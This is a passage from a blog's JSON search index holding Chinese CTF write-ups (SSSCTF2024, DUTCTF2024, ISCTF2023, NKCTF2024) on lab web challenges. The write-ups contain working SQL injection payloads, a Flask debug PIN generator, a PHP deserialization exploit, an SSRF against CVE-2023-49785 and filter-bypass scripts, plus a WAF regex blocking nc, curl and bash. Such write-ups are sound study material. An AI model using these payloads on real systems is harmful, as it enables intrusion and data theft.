得到用户名密码分别为：Scr1w_admin，sssctf2024_P@ssvv0rd GPT那有一个CVE漏洞，为CVE-2023-49785 CVE-2023-49785ChatGPT-Next-Web 的 API Endpoint /api/cors 上存在 SSRF 漏洞，可被用于从服务器端发起任意网络请求并取得响应内容。 /api/cors用于开放代理，允许未经身份验证的用户通过它发送任意HTTP请求，不过这会存在一个问题：它允许客户端通过服务器端端点访问跨域资源，从而绕过内置的浏览器保护以访问跨域资源。 例如下图： 由于题目告诉我们flag是被藏在scr1wgpt-web里，所以直接访问/api/cors/http/scr1wgpt-web/generator","link":"/2024/05/07/competition/202404/sssctf2024/"},{"title":"DUTCTF2024复现","text":"WEB数据库初学者 :disappointed:我知道这是sql注入，但唯独就没有往报错注入考虑，一直给我语法报错我还以为是哪写的不对……:sob::sob::sob: :::info 报错注入常用的函数updatexml的简单了解 updatexml(xml_doument,XPath_string,new_value) 第一个参数是xml文件的内容，格式一般为string 第二个参数是文件需要更新的位置，即Xpath路径 第三个参数是文件更新后的内容 所以在采用报错注入的时候，第一个和第三个是随便写的，至于第二个嘛，就是注入的位置，待会看看Xpath ::: 一个简单的登录系统想要检查有无漏洞就需要最朴素的检测方式 引号闭合 这里测字段不多说，1‘ order by 1#即可（有3个字段） 报错注入试试 1' and updatexml(0,concat(0x7e,database()),0)# 然后就是正常的爆列表爆字段了 1' and updatexml(0,concat(0x7e,substr((select table_name from information_schema.tables where table_schema = 'FreakingData' limit 0,1),1,40)),0)# ==（limit 0,1这一部分指的是全表扫描到第0条后截取一条数据，所以会存在只有一条数据的情况）== 1' and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = 'SPRING_SESSION' limit 0,1),1,40)),0)# 1' and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1,40)),0)# 1' and updatexml(0,concat(0x7e,substr((select password from users limit 0,1),1,40)),0)# ==（这一步会导致flag显示不全的原因是报错内容的长度限制为32，所以可以利用substr函数的特性，改变截取字符串的起点终点）== Flask File Manager开始时账号密码藏的稍微有点隐蔽，原本想要sql注入，但失败了 经过测试，才知道账号为ctfer，密码为dutctf_2024_&gt; _&lt;（有个空格，把它忽略掉，估计是Markdown的一些冲突） 这里我不说废话，直接开门见山，讲一下我认为不可行的路径 首先是传:horse:，这里传入一句话木马上去之后想要读取1.php，但会报permission denied 或者说你想进入upload目录，但是路由没有，说明文件不在我们常见的目录下 目前有点一筹莫展的 做题时无意间找到出题人留下的题目文件 发现app.py有个error路由，且这题与flask有关，猜测可能是flask报错引起的漏洞 成功进入到debug模式 显然，一道flask pin的题目 +++info 谈谈flask pin 为了得到pin码，我们需要以下6个值 flask登录的用户名 modname getaddr(app,”name”,app.class.name) flask库下app.py的绝对路径 当前网络mac地址的十进制数 docker机器的id +++ 一些敏感信息我们是需要较高权限才能读取，显然我们的权限不够 这里给出app.py 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243from flask import Flask, render_template, request, redirect, url_for, session, jsonify, abortimport osimport jsonapp = Flask(__name__)# 从文件中读取密钥SECRET_KEY_FILE = 'SECRETKEY'with open(SECRET_KEY_FILE, 'r') as f: app.secret_key = f.read().strip()# 文件存储路径USER_DATA_FILE = 'user_data.json'# 上传文件保存的目录UPLOAD_FOLDER = '/upload'app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER# 检查用户权限def check_permission(username, file_path): with open(USER_DATA_FILE, 'r') as f: user_data = json.load(f) if username in user_data: permissions = user_data[username].get('permissions', []) for path, access in permissions.items(): if file_path.startswith(path) and access == 'read': return True return False# 读取文件内容def read_file(file_path, username): if check_permission(username, file_path): try: with open(file_path, 'r') as f: return f.read() except FileNotFoundError: return 'File not found.' else: return 'Permission denied.'# 登录路由@app.route('/login', methods=['GET', 'POST'])def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] with open('user_data.json', 'r') as f: user_data = json.load(f) if username in user_data and user_data[username]['password'] == password: session['logged_in'] = True session['username'] = username session['is_admin'] = user_data[username].get('is_admin', False) # 从user_data.json中读取用户是否为管理员信息 return redirect(url_for('file_reader')) else: return 'Invalid username/password' return render_template('login.html')# 验证用户身份def authenticate_user(username, password): with open(USER_DATA_FILE, 'r') as f: user_data = json.load(f) if username in user_data: return user_data[username]['password'] == password return False# 文件管理器路由@app.route('/file_reader', methods=['GET', 'POST'])def file_reader(): if not session.get('logged_in'): return redirect(url_for('login')) if request.method == 'POST': file_path = request.form['file_path'] # 检查目录路径是否合法 if file_path != '/' and (not all(char.isalnum() or char in ['/', '_', '-', '.'] for char in file_path) or '..' in file_path): abort(400, 'Invalid directory path') # 检查目录路径是否包含 'flag' if 'flag' in file_path: abort(400, 'Nah, flag not allowed') # 检查用户是否有权限访问特定文件或目录 if not check_permissions(file_path, session['username']): abort(403, 'You are not authorized to read this file') file_content = read_file(file_path, session['username']) # 检查文件内容是否为空，如果为空则文件不存在 if not file_content: abort(404, 'File not found') return render_template('file_reader.html', file_content=file_content) return render_template('file_reader.html', file_content=None)# 退出登录路由@app.route('/logout')def logout(): session.pop('logged_in', None) session.pop('username', None) return redirect(url_for('login'))# 获取权限页面路由@app.route('/get_user_permissions', methods=['GET', 'POST'])def get_user_permissions(): if request.method == 'GET': # 渲染模板并传递用户列表 with open('user_data.json', 'r') as f: user_data = json.load(f) users = list(user_data.keys()) return render_template('get_user_permissions.html', users=users) elif request.method == 'POST': # 获取POST请求中选择的用户 selected_user = request.form['user'] # 从 JSON 文件中读取用户信息 with open('user_data.json', 'r') as f: user_data = json.load(f) # 获取特定用户的权限配置 permissions = user_data.get(selected_user, {}).get('permissions', {}) return jsonify(permissions)# 更新权限页面路由@app.route('/update_permissions', methods=['GET', 'POST'])def update_permissions(): if not session.get('logged_in'): return redirect(url_for('login')) if not session.get('is_admin'): abort(403, 'User not allowed') # 从 JSON 文件中读取用户信息 with open('user_data.json', 'r') as f: user_data = json.load(f) if request.method == 'GET': # 如果用户不是管理员，只允许修改自己的权限 if not session.get('is_admin'): users = [session['username']] else: users = [user for user, data in user_data.items()] # 提取所有非管理员用户的用户名 # users = [user for user, data in user_data.items() if not data['is_admin']] return render_template('update_permissions.html', users=users) elif request.method == 'POST': # 获取表单数据 user = request.form['user'] path = request.form['path'] access = request.form['access'] # 检查新添加的目录路径是否只包含 '/'、'_'、'-'数字和字母，且以'/'结尾 if path != '/' and not (path.endswith('/') and all(char.isalnum() or char in ['/', '_', '-'] for char in path[:-1])): abort(400, 'Invalid directory path') # 检查新添加的目录路径是否包含 'flag' if 'flag' in path: abort(400, 'Nah, flag not allowed') # 如果用户不是管理员，只允许修改自己的权限 if not session.get('is_admin') and user != session['username']: abort(403, &quot;You are not authorized to modify other users' permissions&quot;) # 检查添加的目录是否与已存在的目录相同 if path in user_data[user]['permissions']: abort(400, &quot;Directory already exists&quot;) # 更新用户权限 user_data[user]['permissions'][path] = access with open('user_data.json', 'w') as f: json.dump(user_data, f, indent=4) return redirect('/update_permissions')# 文件上传路由@app.route('/file_uploader', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': if 'file' not in request.files: abort(400, 'No file part') file = request.files['file'] if file.filename == '': abort(400, 'No selected file') if not all(char.isalnum() or char in ['.', '_', '-'] for char in file.filename): abort(400, 'Invalid filename') # 检查目录下是否已经存在同名文件 target_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename) if os.path.exists(target_path): abort(400, &quot;File already existed&quot;) if file: file.save(target_path) return 'File uploaded successfully' # 如果是 GET 请求，则返回文件上传页面 return render_template('file_uploader.html')# 根路径重定向至登录页面@app.route('/')def index(): return redirect(url_for('login'))def check_permissions(file_path, username): # 检查用户是否有权限访问特定文件或目录 # 从 JSON 文件中读取用户信息 with open('user_data.json', 'r') as f: user_data = json.load(f) # 获取用户的权限配置 user_permissions = user_data.get(username, {}).get('permissions', {}) # 检查文件路径是否与用户权限配置中的某个路径匹配 for permission_path in user_permissions.keys(): if file_path.startswith(permission_path): return True return False@app.route('/error')def error(): with open('/flag', 'r') as flag: flag = flag.read() assert flag == &quot;dutctf{Fak3_fl@g_2333}&quot; return render_template('error.html')if __name__ == '__main__': # 初始化用户数据文件 if not os.path.exists(USER_DATA_FILE): with open(USER_DATA_FILE, 'w') as f: json.dump({}, f) app.run(host='0.0.0.0', port='5000', debug=True) 注意到/update_permissions有对管理员的身份进行检测，且开头处给出了secretkey，猜测有flask session伪造 先decode 根据提示，来到出题人的github中，找到相关题目的commit 找到SECRET_KEY 然后把相关权限改一下之后加密 然后update permissions 把根目录的读权限交给ctfer 然后根据解pin码的需求找到6个相关的数据 读取/etc/passwd flask登录的用户名是root modname默认值为flask.app appname默认值为Flask moddir（flask下的绝对路径）可以通过报错界面来得知：/usr/local/lib/python3.9/site-packages/flask/app.py 网络mac可以通过/sys/class/net/eth0/address获得 中间冒号去掉后得到的数转换为十进制就是我们需要的值：2485376909319 docker机器的id可以通过/etc/machine-id或者/proc/sys/kernel/random/boot_id得到：c5391a8d-9aa2-4478-9b74-012e3e76e356 六个值都得到了，现在来写脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'root' 'flask.app', 'Flask', '/usr/local/lib/python3.9/site-packages/flask/app.py']private_bits = [ '2485376909319', 'c5391a8d-9aa2-4478-9b74-012e3e76e356' # 按道理来说这里是machine_id或者boot_id与/proc/self/cgroup，但我访问之后却发现是空，所以我直接把boot_id放上去了，不影响解题]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 解出pin码后应该就可以通过了 读取flag WeirdBash一个简单的编码系统，先看看能得出什么 经过数次编码，推测是每个字母数字符号都有一个唯一的noob编码，组合起来的字符串在编码后变成每个字符编码连起来的形式 尝试输入敏感命令，但都只是被编码，没有任何多余的操作 考虑输入一些敏感信息，如flag，/etc/passwd等 输入dutctf发现奇怪的编码 猜测是一个含有敏感信息的语句 这个可以一个个字符输出来作为对照表，也可以写脚本直接秒 脚本如下： 123456789101112131415161718192021222324252627282930import requestsfrom bs4 import BeautifulSoup# 函数用于发送POST请求并获取编码值def get_encoded_value(input_char): url = &quot;http://10.7.37.200:10166/encode&quot; data = {'input_string': input_char} response = requests.post(url, data=data) if response.status_code == 200: soup = BeautifulSoup(response.text, 'html.parser') encoded_value = soup.find('pre').text # 根据实际返回的HTML结构调整 return encoded_value else: return &quot;Error&quot;# ASCII字符范围从32到126start_ascii = 32end_ascii = 126# 输出文件名output_file = 'encoded_values.txt'with open(output_file, 'w') as file: for i in range(start_ascii, end_ascii + 1): char = chr(i) encoded_value = get_encoded_value(char) # 格式化字符串，如 &quot;0 noob!noob?&quot; output_line = f&quot;{char} {encoded_value}\\n&quot; file.write(output_line) print(output_line) # 在控制台输出 这句话大致意思就是让我们进入noob目录下面，有东西 进入到noob目录下 发现是noob解码，可以考虑将命令进行noob编码后再解码得到命令执行后的结果，感觉跟序列化和反序列化的效果差不多{. info} （这里是ls编码之后的结果） 之后cat /flag即可 Cryptoez_rsatest3 鳗什么罐头我说test4","link":"/2024/03/18/competition/202403/DUTCTF2024/"},{"title":"ISCTF2023","text":"WEB绕进你心里123456789101112131415161718192021222324 &lt;?phphighlight_file(__FILE__);error_reporting(0);require 'flag.php';$str = (String)$_POST['pan_gu'];$num = $_GET['zhurong'];$lida1 = $_GET['hongmeng'];$lida2 = $_GET['shennong'];if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2)){ echo &quot;md5绕过了!&quot;; if(preg_match(&quot;/[0-9]/&quot;, $num)){ die('你干嘛?哎哟!'); } elseif(intval($num)){ if(preg_match('/.+?ISCTF/is', $str)){ die(&quot;再想想!&quot;); } if(stripos($str, '2023ISCTF') === false){ die(&quot;就差一点点啦!&quot;); } echo $flag; }}?&gt; md5的绕过不多说，数组直接奉上；intval()的绕过也可以用数组，它在处理数组时，若数组为空，则返回0，否则返回1 下一关就是利用preg_match()的特性绕过，preg_match()有一个回溯次数上限（可以类比于查询字符/字符串的次数上限）默认是1000000，超过这个数则返回false exp： 12345import requestsurl = 'http://gz.imxbt.cn:20308/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=3'data = {&quot;pan_gu&quot;: 'ssss'*250000 + '2023ISCTF'}req = requests.post(url=url,data=data)print(req.text) 圣杯战争简单的反序列化，pop： summon::__wakeup()-&gt;artifact::__toString()-&gt;prepare::__get()-&gt;saber::__invoke() exp: 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass artifact{ public $excalibuer; public $arrow; public function __toString(){ return $this-&gt;excalibuer-&gt;arrow; }}class prepare{ public $release; public function __get($key){ $functioin = $this-&gt;release; return $functioin(); }}class saber{ public $weapon='php://filter/read=convert.base64-encode/resource=flag.php'; public function __invoke(){ include($this-&gt;weapon); }}class summon{ public $Saber; public $Rider; public function __wakeup(){ echo $this-&gt;Saber; }}$Summon = new summon();$Artifact = new artifact();$Prepare = new prepare();$Saber = new saber();$Summon-&gt;Saber = $Artifact;$Artifact-&gt;excalibuer = $Prepare;$Prepare-&gt;release = $Saber;echo(urlencode(serialize($Summon)));?&gt; webinclude12345678910111213141516171819202122232425262728293031323334 function string_to_int_array(str){ const intArr = []; for(let i=0;i&lt;str.length;i++){ const charcode = str.charCodeAt(i); const partA = Math.floor(charcode / 26); const partB = charcode % 26; intArr.push(partA); intArr.push(partB); } return intArr; } function int_array_to_text(int_array){ let txt = ''; for(let i=0;i&lt;int_array.length;i++){ txt += String.fromCharCode(97 + int_array[i]); } return txt; }const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(parameter))));if(hash === 'dxdydxdudxdtdxeadxekdxea'){ window.location = 'flag.html'; }else { document.getElementById('fail').style.display = ''; } （这里扫出来一个index.bak文件，之前没扫出来是因为被校园网过滤掉了） 写一个逆向解密： 12345678910111213141516171819202122232425const parameter2 = 'dxdydxdudxdtdxeadxekdxea';function text_to_int_array(text){ let int_array = []; for(let i=0;i&lt;text.length;i++){ let charcode = text.charCodeAt(i) - 97; int_array.push(charcode) } return int_array;}function int_array_to_string(int_array2){ let text2 = ''; for(let i=0;i&lt;int_array2.length;i+=2){ parta = int_array2[i]; partb = int_array2[i+1]; let charcode2 = parta * 26 + partb; text2 += String.fromCharCode(charcode2); } return text2;}answer = int_array_to_string(text_to_int_array(int_array_to_string(text_to_int_array(parameter2))));console.log(answer); 得到mihoyo 然后就是普通的文件包含了（之前dirsearch扫出来还有个flag.php） easy_websitesql注入，简单地fuzz一下，发现过滤了or，and，select，空格等，对字符串的过滤可以用双写绕过，空格可以用/**/绕过。这题考虑报错注入而非盲注 admin'/**/anandd/**/updatexml(1,concat(0x7e,database(),0x7e),1);# -&gt; users admin'/**/anandd/**/updatexml(1,concat(0x7e，(selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='users'),0x7e),1);# -&gt; users admin'/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='users'/**/anandd/**/table_schema='users'),0x7e),1);# -&gt; user，password admin'/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),0x7e),1);# 这里因为输出限制导致flag没有输出完整，可以用substring或者mid之类的函数 flag{f5ea3f34-c0eb-45ac-b35d admin'/**/anandd/**/updatexml(1,concat(0x7e,substring((selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),19,30),0x7e),1);# 45ac-b35d-623f62014c27} wafr1234567891011121314151617181920212223&lt;?php/*Read /flaggggggg.txt*/error_reporting(0);header('Content-Type: text/html; charset=utf-8');highlight_file(__FILE__);if(preg_match(&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;, $_POST['code'])){//strings die(&quot;想读我文件？大胆。&quot;);}elseif (preg_match(&quot;/\\^|\\||\\~|\\\\$|\\%|jay/i&quot;, $_POST['code'])){ die(&quot;无字母数字RCE？大胆！&quot;);}elseif (preg_match(&quot;/bash|nc|curl|sess|\\{|:|;/i&quot;, $_POST['code'])){ die(&quot;奇技淫巧？大胆！！&quot;);}elseif (preg_match(&quot;/fl|ag|\\.|x/i&quot;, $_POST['code'])){ die(&quot;大胆！！！&quot;);}else{ assert($_POST['code']);} 这题是个纸老虎，\\并没有过滤，可以照常读取文件 1z_Ssql过滤了=，+，sleep，union，where order by测出来有三个字段（不过似乎没啥用？） 不过看过滤情况只能是布尔盲注 测试admin' and if(length(database())&gt;1,1,0);#后发现有hint相关回显（虽然那hint没什么用就是了），是布尔盲注无疑了 （原题中好像是有附件的，但是这上面没有，只能看wp复现了：得到表名users和列名username，password 直接上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsurl = 'http://gz.imxbt.cn:20511/'# for i in range(40):# payload = f'admin\\' and if(length(database())&gt;{i},1,0);#' # data = { # 'username': payload, # 'password': 1234, # 'submit': 1 # }# print(payload)# req = requests.post(url=url,data=data)# for j in range # if 'hint' in req.text:# continue# else:# print(i)# break # length = 6result = ''for i in range(1,50): left = 32 right = 127 mid = (left + right) &gt;&gt; 1 while left &lt; right: # payload = f'admin\\' and if((ascii(substr(database(),{i},1))&gt;{mid}),1,0)#' # bthcls # payload = f'admin\\' and if((ascii(substr((select group_concat(username) from bthcls.users),{i},1))&gt;{mid}),1,0)#' # admin payload = f'admin\\' and if((ascii(substr((select group_concat(password) from bthcls.users),{i},1))&gt;{mid}),1,0)#' # we1come7o1sctf data = { 'username': payload, 'password': 1234, 'submit': 1 } req = requests.post(url=url,data=data) print(payload) if 'hint' in req.text: left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 result += chr(mid) print(result) :::info no-icon 后面看wp才发现有信息泄露： 123456789101112 &lt;?phphighlight_file(&quot;here_is_a_sercet.php&quot;);function waf($str){ $black_list = &quot;762V08zk+xrmKxIFrdJIJj6ULvI8Lc0pX39LjDyIUb0eAGkZe4KQa87TJXuqnFw0u/669wWRsqYFya812FtULw9+tpiGlaH2gleDfDKzr+g=&quot;; if (preg_match($black_list,$str)){ die(&quot;&lt;h4&gt;illegal words!&lt;/h4&gt;&quot;); } return $str;}?&gt; base64不能直接解密，可以在主页看看用的是什么方式加密 是一个SM4加密 直接找工具解密即可，waf是/union|=|+|sleep|benchmark|for|where|sys|innodb|is|null|like|/*|*//i ::: Where is the flag标准的一句话木马，实际上想考察的是linux的一些命令 第一个flag：当前目录下的flag.php ISCTF{Y0u_6u 第二个flag：根目录下一个flag cceeded_in_f 第三个flag：flag.sh里面 ind1n9_f1ag} 这个不知道对不对，当时在做的时候第二个找都找不到，flag1还是在/flag里面的 后面根据提示，在xxx中，猜想环境变量中应该是有的，毕竟web动态题生成flag还是很依赖环境变量来随机生成的 直接system('env');,发现还真有 ez_php这题看着没太大突破扣，那就找一下附件里面有没有什么可以利用的吧 注意到register.php中 1234567891011121314151617181920&lt;?php include &quot;utils/function.php&quot;; $config = include &quot;utils/config.php&quot;; $user_xml_format = &quot;&lt;?xml version='1.0'?&gt; &lt;userinfo&gt; &lt;user&gt; &lt;username&gt;%s&lt;/username&gt; &lt;password&gt;%s&lt;/password&gt; &lt;/user&gt; &lt;/userinfo&gt;&quot;; extract($_REQUEST); if(empty($username)||empty($password)) die(&quot;Username or password cannot be empty XD&quot;); if(!preg_match('/^[a-zA-Z0-9_]+$/', $username)) die(&quot;Invalid username. :(&quot;); if(is_user_exists($username, $config[&quot;user_info_dir&quot;])) die(&quot;User already exists XD&quot;); $user_xml = sprintf($user_xml_format, $username, $password); register_user($username, $config['user_info_dir'], $user_xml); 存在变量覆盖函数，可以试着往这个点打 同时发现，用户名和密码是以xml形式来存储的，根据这个可以试着用xxe打 由于function.php中存在这样一个函数 1234567function get_user_record($username, $user_info_dir) { $user_info_xml = file_get_contents($user_info_dir.$username.'/'.$username.'.xml'); $dom = new DOMDocument(); $dom-&gt;loadXML($user_info_xml, LIBXML_NOENT | LIBXML_DTDLOAD); return simplexml_import_dom($dom); } 这样可以利用file://协议去读取flag login.php中： 12345678910&lt;?php include &quot;utils/function.php&quot;; $config = include &quot;utils/config.php&quot;; $username = $_REQUEST['username']; $password = $_REQUEST['password']; if(empty($username)||empty($password)) die(&quot;Username or password cannot be empty XD&quot;); if(!is_user_exists($username, $config[&quot;user_info_dir&quot;])) die(&quot;Username error&quot;); $user_record = get_user_record($username, $config['user_info_dir']); if($user_record-&gt;user-&gt;password != $password) die(&quot;Password error for User:&quot;.$user_record-&gt;user-&gt;username); header(&quot;Location:main.html&quot;); 我们可以通过输入错误的密码来让我们的注入得到回显 先抓个包，注册一个账号 然后故意输错密码： 成功回显，可以直接拿flag了 ez_ini根据题目可以用.user.ini进行文件包含，由于在之前的测试中测出许多关键符号被过滤，所以只能放弃上传:horse:，转而用文件包含漏洞 这里我们可以包含日志文件，利用UA传:horse: 然后访问upload.php","link":"/2024/05/16/competition/Others/ISCTF2023/"},{"title":"NKCTF2024","text":"WEBMy first cms这题我要背锅，因为我顺着版本号找CVE结果找出来是个错家伙。我找的是CVE-2024-27625，但是题目出的是CVE-2024-27622…….:fearful: 不过在做的时候也是离谱，我开始猜测弱密码爆破是对的，结果被自己找的弱密码给坑了……:cold_sweat: CVE-2024-27625是XSS攻击，CVE-2024-27622是远程RCE。 从一些漏洞情报的网站上看后得知，前者是因为开发者没有注意或者清理用户新建目录（不过更多是感觉没有做严格过滤），导致攻击者可以通过新建目录的字段植入恶意代码，从而引发持续性的XSS攻击；后者也是因为没有注意或者清理用户的输入，导致攻击者可以通过获取管理员权限来进行php代码的编写与执行。 反正，这道题特别简单。找个输入的地方然后写:horse:即可","link":"/2024/03/26/competition/202403/NKCTF2024/"},{"title":"","text":"友链约法N章 拒绝黄赌毒链，做新时代好市民 友链排名规则基于时间 友链信息需提供站点名称，站点概述，站点地址和站点logo（自己头像也行） To be continued 本站友链信息如下： 博客头像：https://github.com/LuffyS93/luffys93.github.io/blob/main/img/LUFFY.jpg 博客地址：https://luffys93.github.io/ 博客概述：Web手，打工人 博客名称：Ins0mn1a 一大波友链正在来袭......","link":"/2024/07/31/friend/index/"}],"tags":[],"categories":[{"name":"计网","slug":"计网","link":"/categories/%E8%AE%A1%E7%BD%91/"},{"name":"Scr1w平台","slug":"Scr1w平台","link":"/categories/Scr1w%E5%B9%B3%E5%8F%B0/"},{"name":"buu平台","slug":"buu平台","link":"/categories/buu%E5%B9%B3%E5%8F%B0/"},{"name":"Vulhub","slug":"Vulhub","link":"/categories/Vulhub/"},{"name":"比赛","slug":"比赛","link":"/categories/%E6%AF%94%E8%B5%9B/"}],"pages":[]}